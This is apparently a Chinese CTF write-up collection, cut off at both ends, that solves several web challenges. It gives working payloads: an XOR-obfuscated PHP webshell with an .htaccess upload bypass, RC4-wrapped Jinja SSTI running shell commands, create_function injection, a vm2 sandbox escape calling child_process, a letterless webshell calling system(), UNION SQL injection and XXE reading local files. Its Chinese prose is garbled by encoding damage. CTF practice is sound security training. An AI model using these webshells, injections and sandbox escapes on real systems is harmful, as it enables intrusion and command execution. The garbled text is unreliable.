die(\u0026#34;^_^\u0026#34;); if(!exif_imagetype($tmp_name)) die(\u0026#34;^_^\u0026#34;); $path= $userdir.\u0026#34;/\u0026#34;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); } } $hhh = @$_GET[\u0026#39;_\u0026#39;]; if (!$hhh){ highlight_file(__FILE__); } if(strlen($hhh)\u0026gt;18){ die(\u0026#39;One inch long, one inch strong!\u0026#39;); } if ( preg_match(\u0026#39;/[\\x00- 0-9A-Za-z\\\u0026#39;\u0026#34;\\`~_\u0026amp;.,|=[\\x7F]+/i\u0026#39;, $hhh) ) die(\u0026#39;Try something else!\u0026#39;); $character_type = count_chars($hhh, 3); if(strlen($character_type)\u0026gt;12) die(\u0026#34;Almost there!\u0026#34;); eval($hhh); ?\u0026gt; è¿‡æ»¤äº†å–åç¬¦å·ï¼Œåªèƒ½å¼‚æˆ–æ¥ç»•è¿‡å†™webshell\nå¼‚æˆ–è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php function finds($string){ $index = 0; $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255]; for($i=27;$i\u0026lt;count($a);$i++){ for($j=27;$j\u0026lt;count($a);$j++){ $x = $a[$i] ^ $a[$j]; for($k = 0;$k\u0026lt;strlen($string);$k++){ if(ord($string[$k]) == $x){ echo $string[$k].\u0026#34;\\n\u0026#34;; echo \u0026#39;%\u0026#39; . dechex($a[$i]) . \u0026#39;^%\u0026#39; . dechex($a[$j]).\u0026#34;\\n\u0026#34;; $index++; if($index == strlen($string)){ return 0; } } } } } } finds(\u0026#34;_GET\u0026#34;); ?\u0026gt; 1 2 ?.=${%80%80%80%80^%DF%C7%C5%D4}{%81}();\u0026amp;%81=phpinfo //è¿™é‡Œ.å’Œ_ä¸€æ ·çš„ éé¢„æœŸæ˜¯ç›´æ¥æœflagå°±å‡ºæ¥äº†\né¢„æœŸè§£åˆ©ç”¨get_the_flagå‡½æ•°\næ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†è¿‡æ»¤äº†æ‹“å±•åphï¼Œè€Œä¸”æŠŠ\u0026lt;?è¿‡æ»¤äº†ï¼Œä½†æ˜¯php7ä¸èƒ½ç”¨scriptæ ‡ç­¾ç»•è¿‡äº†\nexif_imagetypeä¸èƒ½ç®€å•ç”¨GIF89aç»•è¿‡äº†ï¼Œè¿™é‡Œå¯ä»¥åœ¨.htaccessæ·»åŠ æ–‡ä»¶å¤´\n1 2 #define width 1 #define height 1 1 2 3 æˆ–è€…åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹) x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ .htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess åˆ©ç”¨php_value auto_append_fileæŒ‡å®šæ–‡ä»¶åŒ…å«ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨base64æ¥è¿›è¡Œç»•è¿‡\u0026lt;?æ ‡ç­¾é™åˆ¶\n1 2 3 4 #define width 1 #define height 1 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./1.jpg\u0026#34; ç„¶ååœ¨1.jpgé‡Œé¢å†™å…¥base64çš„é©¬\n1 2 GIF89abb PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4 è¿™é‡Œå› ä¸ºbase64è§£å¯†æ˜¯4ä½ä¸€è§£ç ï¼Œæˆ‘ä»¬è¡¥ä¸Šä¸¤ä¸ªbå‡‘å››ä½\nåˆ©ç”¨è„šæœ¬ä¸Šä¼ \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests import base64 htaccess = b\u0026#34;\u0026#34;\u0026#34; #define width 1337 #define height 1337 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./shell.jpg\u0026#34; \u0026#34;\u0026#34;\u0026#34; shell = b\u0026#34;GIF89abbPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4\u0026#34; url = \u0026#34;http://0e57dfd9-bd66-4101-8c76-8baa918b86bb.node5.buuoj.cn:81/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();\u0026amp;%86=get_the_flag\u0026#34; files = {\u0026#39;file\u0026#39;:(\u0026#39;.htaccess\u0026#39;,htaccess,\u0026#39;image/jpeg\u0026#39;)} data = {\u0026#34;upload\u0026#34;:\u0026#34;Submit\u0026#34;} response = requests.post(url=url, data=data, files=files) print(response.text) files = {\u0026#39;file\u0026#39;:(\u0026#39;shell.jpg\u0026#39;,shell,\u0026#39;image/jpeg\u0026#39;)} response = requests.post(url=url, data=data, files=files) print(response.text) å‡ºæ¥è·¯å¾„\n1 2 upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/.htaccess upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/shell.jpg èšå‰‘è¿æ¥æ’ä»¶ç»•è¿‡\næˆ–è€…å†™æ–‡ä»¶æ¥è¯»æ ¹ç›®å½•ä¸‹æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php mkdir(\u0026#39;img\u0026#39;); chdir(\u0026#39;img\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;); var_dump(scandir(\u0026#39;/\u0026#39;)); ?\u0026gt; è¯»åˆ°ä¹‹å\n1 echo file_get_contents(\u0026#34;/THis_Is_tHe_F14g\u0026#34;); [CISCN2019 åä¸œå—èµ›åŒº]Double Secret ç›®å½•æ‰«ææ‰«å‡º/console\nå¾—ç®—pinç äº†ï¼Œä½†æ˜¯ä¿¡æ¯ä¸å¤Ÿ\nå›åˆ°åŸæ¥ç•Œé¢ï¼Œè®¿é—®/secretè·¯ç”±\nä¼ å‚secretï¼Œå‡ºç°æŠ¥é”™\nrc4åŠ å¯†\n1 2 3 4 5 6 7 8 9 10 if(secret==None): return \u0026#39;Tell me your secret.I will encrypt it so others can\\\u0026#39;t see\u0026#39; rc=rc4_Modified.RC4(\u0026#34;HereIsTreasure\u0026#34;) #è§£å¯† deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if \u0026#39;ciscn\u0026#39; in a.lower(): return \u0026#39;flag detected!\u0026#39; return a æ‰“sstiç„¶åç”¨rc4åŠ å¯†ï¼Œç”¨cyberchefåŠ å¯†\næˆ–è€…ä¸Šè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import base64 from urllib.parse import quote def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): # print(\u0026#34;RC4åŠ å¯†ä¸»å‡½æ•°\u0026#34;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\u0026#34;åŸæ¥çš„ s ç›’ï¼š%s\u0026#34; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\u0026#34;æ··ä¹±åçš„ s ç›’ï¼š%s\u0026#34;% s_box) return s_box def rc4_excrypt(plain, box): # print(\u0026#34;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚\u0026#34;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;%s\u0026#34; %quote(cipher)) return (str(base64.b64encode(cipher.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) rc4_main(\u0026#34;HereIsTreasure\u0026#34;,\u0026#34;{{lipsum.__globals__.__builtins__.eval(\\\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag.txt\u0026#39;).read()\\\u0026#34;)}}\u0026#34;) 1 2 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag.txt\u0026#34;).read()\u0026#39;)}} [GKCTF 2021]easycms ç›®å½•æ‰«æadmin.php\nå¼±å£ä»¤admin/12345ç™»å…¥\nåœ¨è®¾è®¡è¿™é‡Œè‡ªå®šä¹‰å¯ä»¥ç¼–è¾‘phpä»£ç \n/var/www/html/system/tmp/tgom.txt\næ–°å»ºä¸€ä¸ªæ–‡ä»¶,ä¸Šä¼ åç¼–è¾‘\næ–‡ä»¶åä¸º../../../../../system/tmp/tgom\nç„¶åå›å»ç¼–è¾‘å°±è¡Œäº†ï¼Œå›åˆ°ä¸»é¡µå°±èƒ½çœ‹åˆ°flag\nå¦ä¸€ç§åšæ³•ï¼Œå¯¼å‡ºä¸»é¢˜\nä¼šæç¤ºä¸‹è½½ï¼Œå¤åˆ¶ä¸‹è½½è¿æ¥\n1 http://18f6826c-975b-4018-8d7c-014a078b56b0.node5.buuoj.cn:81/admin.php?m=ui\u0026amp;f=downloadtheme\u0026amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA= æŠŠåé¢è¿™ä¸²base64è§£ç \n1 /var/www/html/system/tmp/theme/default/1.zip æˆ‘ä»¬æ”¹ä¸º/flagå°±è¡Œäº†\nç„¶åä¸‹è½½å¾—åˆ°flag\n[BJDCTF2020]EzPHP çœ‹æºç æœ‰base32ç¼–ç ï¼Œè§£ç å¾—1nD3x.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; ç¬¬ä¸€å±‚\n1 2 3 4 if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) è¿™ä¸€å±‚ç”¨urlç¼–ç ç»•è¿‡\n1 ?%73hana=1 ç¬¬äºŒå±‚\n1 2 if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) åœ¨ä¼ å…¥å‚æ•°æœ€ååŠ å…¥æ¢è¡Œç¬¦å°±èƒ½ç»•è¿‡%0a\n1 ?%64ebu=%61qua_is_%63ute%0a ç¬¬ä¸‰å±‚\n1 2 3 if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) $_REQUESTåœ¨åŒæ—¶æ¥æ”¶GETå’ŒPOSTå‚æ•°æ—¶ï¼ŒPOSTä¼˜å…ˆçº§æ›´é«˜\næ‰€ä»¥åªéœ€è¦POSTç›¸åŒçš„å‚æ•°å³å¯ç»•è¿‡ã€‚\nç¬¬å››å±‚\n1 if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) ç”¨dataä¼ªåè®®æˆ–è€…php://inputå†™å…¥\nç¬¬äº”å±‚\n1 if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ) æ•°ç»„ç»•è¿‡\n1 ?shana[]=1\u0026amp;passwd[]=2 ç¬¬å…­å±‚\n1 2 if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) $codeå’Œ$argå¯æ§ï¼Œåˆ©ç”¨$code('',$arg)è¿›è¡Œcreate_functionæ³¨å…¥\n1 2 3 4 5 6 7 8 9 åœ¨ä¸Šä¸€é˜¶æ®µçš„extract($_GET[\u0026#34;flag\u0026#34;]);å¤„è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä»è€Œä½¿å˜é‡$codeå’Œå˜é‡$argå¯æ§ é¦–å…ˆé—­åˆåŸæœ‰çš„è¯­å¥ï¼š flag[arg]=} å¾ˆå¤šå‡½æ•°è¢«ç¦ç”¨ï¼Œå…ˆä½¿ç”¨get_defined_vars()å°†æ‰€æœ‰å˜é‡ä¸å€¼éƒ½è¿›è¡Œè¾“å‡º flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// // ç­‰ä»·äº function{ } var_dump(get_defined_vars());//} å¾—åˆ°rea1fl4g.php\nåˆ©ç”¨require()ï¼Œæ¥ä»£æ›¿include()ï¼š\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// å¾—åˆ°å‡flag\nurlå–åç»•è¿‡\n1 2 3 echo urlencode(~\u0026#39;php://filter/read=convert.base64-encode/resource=rea1fl4g.php\u0026#39;); ç”¨require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)) æ›¿æ¢åˆšæ‰çš„var_dump(get_defined_vars())è¢«ç¼–ç çš„éƒ¨åˆ†å³å¯ã€‚ æœ€ç»ˆpayload\n1 2 3 4 5 6 7 // GET ?debu=aqua_is_cute%0a\u0026amp;file=data://text/plain,debu_debu_aqua\u0026amp;shana[]=1\u0026amp;passwd[]=2\u0026amp;flag[arg]=};require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//\u0026amp;flag[code]=create_function ?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A\u0026amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61\u0026amp;%73%68%61%6e%61[]=1\u0026amp;%70%61%73%73%77%64[]=2\u0026amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//\u0026amp;%66%6c%61%67[%63%6f%64%65]=create_function // POST debu=1\u0026amp;file=1 [GYCTF2020]EasyThinking åˆ©ç”¨thinkphp6.0å¾€sessionè¿›è¡Œä»»æ„æ–‡ä»¶å†™å…¥çš„æ¼æ´\næ„é€ PHPSESSIDçš„å€¼ï¼Œæ”¹å€¼é•¿åº¦ä¸º32ä¸”ä¸ºstringå‹ï¼Œç„¶åå°±ä¼šåœ¨/runtime/session/ç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ªphpæ–‡ä»¶\nç„¶åè®¿é—®\n1 /runtime/session/sess_1111111111111111111111111111.php èšå‰‘è¿æ¥ï¼Œæ’ä»¶ç»•è¿‡\n[GXYCTF2019]StrongestMind çˆ¬è™«\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import re import time url = \u0026#39;http://8131dc42-f253-4d5f-b190-58956c615ca6.node5.buuoj.cn:81/\u0026#39; session = requests.session() req = session.get(url).text flag = \u0026#34;\u0026#34; for i in range(1010): try: result = re.findall(\u0026#34;\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;(\\d.*?)\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;\u0026#34;,req)#è·å–[æ•°å­—] result = \u0026#34;\u0026#34;.join(result)#æå–å­—ç¬¦ä¸² result = eval(result)#è¿ç®— print(\u0026#34;time: \u0026#34;+ str(i) +\u0026#34; \u0026#34;+\u0026#34;result: \u0026#34;+ str(result)) data = {\u0026#34;answer\u0026#34;:result} req = session.post(url,data=data).text if \u0026#34;flag{\u0026#34; in req: print(re.search(\u0026#34;flag{.*}\u0026#34;, req).group(0)[:50]) break time.sleep(0.1)#é˜²æ­¢è®¿é—®å¤ªå¿«æ–­å¼€è¿æ¥ except: print(\u0026#34;[-]\u0026#34;) [HFCTF2020]JustEscape æ‰“å¼€ç•Œé¢æœ‰run.php\nä¸‹é¢åˆè¯´çœŸçš„æ˜¯phpå—\n1 2 3 4 5 6 7 8 \u0026lt;?php if( array_key_exists( \u0026#34;code\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;code\u0026#39; ] != NULL ) { $code = $_GET[\u0026#39;code\u0026#39;]; echo eval(code); } else { highlight_file(__FILE__); } ?\u0026gt; è€ƒè™‘åˆ°evalå‡½æ•°ä¸æ­¢phpæœ‰ï¼Œnodejsä¹Ÿæœ‰\nç”¨Error().stackçœ‹æŠ¥é”™ä¿¡æ¯\nä»£ç ç¯‡ - Error Stack - ã€ŠNode.js è°ƒè¯•æŒ‡å—ã€‹ - ä¹¦æ ˆç½‘ Â· BookStack\n1 run.php?code=Error().stack 1 2 3 4 5 6 7 8 9 10 11 Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) vmæ²™ç®±é€ƒé€¸\nç”¨githubæœ‰ç°æˆçš„poc\nBreakout in v3.8.3 Â· Issue #225 Â· patriksimek/vm2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 One can break out of the sandbox via: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ TypeError.prototype.get_process = f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); try{ Object.preventExtensions(Buffer.from(\u0026#34;\u0026#34;)).a = 1; }catch(e){ return e.get_process(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } And another more game breaking one: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ try{ Buffer.from(new Proxy({}, { getOwnPropertyDescriptor(){ throw f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); } })); }catch(e){ return e(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } ç›´æ¥ç”¨ä¼šè¢«waf\nè¿‡æ»¤äº†\n1 [\u0026#39;for\u0026#39;, \u0026#39;while\u0026#39;, \u0026#39;process\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;constructor\u0026#39;, \u0026#39;prototype\u0026#39;, \u0026#39;Function\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;\u0026#39;] å®˜æ–¹wpæ˜¯åœ¨å…³é”®å­—ä¸Šç”¨ä¸¤ä¸ªåå¼•å·ç»•è¿‡,ç„¶åurlç¼–ç ä¸€ä¸‹\n1 2 3 æ¯”å¦‚prototypeå˜æˆ`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e` f.constructor(\u0026#34;return process\u0026#34;)(); f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); 1 /run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})() å¦ä¸€ç§åŠæ³•æ˜¯\n1 2 prototype `${`${`prototyp`}e`}` æŠŠå…³é”®å­—å…¨éƒ¨æ›¿æ¢æˆè¿™ç§æ ¼å¼\n1 2 3 4 5 6 7 8 (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=\u0026gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_proces`}s`}`](()=\u0026gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString(); } })() [SUCTF 2018]GetShell æ— å­—æ¯æ•°å­—webshell\n1 2 3 4 5 6 7 8 \u0026lt;?php $_=[]; $__=$_.$_; $_=($_==$__); $__=($_==$_); $___ = ~åŒº[$__].~å†ˆ[$__].~åŒº[$__].~å‹º[$__].~çš®[$__].~é’ˆ[$__]; $____ = ~ç [$__].~å¯¸[$__].~å°[$__].~æ¬ [$__].~ç«‹[$__]; $____($$__[_]); system($_POST[_]) è¯»ç¯å¢ƒå˜é‡\n[b01lers2020]Life on Mars sqlæ³¨å…¥\n1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata\u0026amp;{}\u0026amp;_=1745230942307 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=\u0026#39;alien_code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=\u0026#39;code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(code)from/**/alien_code.code EasyBypass ez\n1 /?comm1=\u0026#34;;sort+/fla?;\u0026#34;\u0026amp;comm2=1 [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome postä¼ \n1 roam1[]=1\u0026amp;roam2[]=2 [CSAWQual 2019]Web_Unagi æœ‰wafçš„xxe,é¢˜ç›®ç»™æ ¼å¼\n1 2 3 4 5 6 7 8 9 \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;alice\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;passwd1\u0026lt;/password\u0026gt; \u0026lt;name\u0026gt;Alice\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;alice@fakesite.com\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;CSAW2019\u0026lt;/group\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; ç›´æ¥å…¨éƒ¨å˜æˆ\u0026amp;xxe;\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE users [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt;]\u0026gt; \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;\u0026amp;xxe;\u0026lt;/password\u0026gt; 